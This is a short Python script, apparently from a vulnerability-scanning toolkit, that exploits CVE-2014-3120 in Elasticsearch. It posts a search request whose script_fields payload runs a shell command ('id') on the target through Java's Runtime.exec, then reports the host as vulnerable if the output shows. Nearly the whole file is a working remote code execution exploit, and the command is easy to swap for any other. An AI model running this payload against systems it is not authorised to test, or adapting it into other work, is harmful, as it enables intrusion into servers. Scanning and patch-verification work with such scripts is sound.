"""
@Author: exiashow
@File: CVE-2014-3120.py
@Date: 2024/2/26 11:34
@Desc: CVE-2014-3120 command execute
@Module: 
"""

import requests
import sys


class CVE20143120(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = r'''
        {
            "size": 1,
            "query": {
            "filtered": {
            "query": {
            "match_all": {
                  }
                }
              }
            },
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        '''

        path = ":9200/_search?pretty"

        try:
            conn = requests.post("http://" + self.url + path, data=payload, timeout=5)
            if "uid" in conn.text:
                return "[Warning] Elasticsearch vulnerability discovered: CVE-2014-3120"
            else:
                return "[Nice] Not Found: CVE-2014-3120"

        except Exception as e:
            return "[Error] " + str(e)


if __name__ == "__main__":
    fallingSword = CVE20143120(sys.argv[1])
    fallingSword.run()
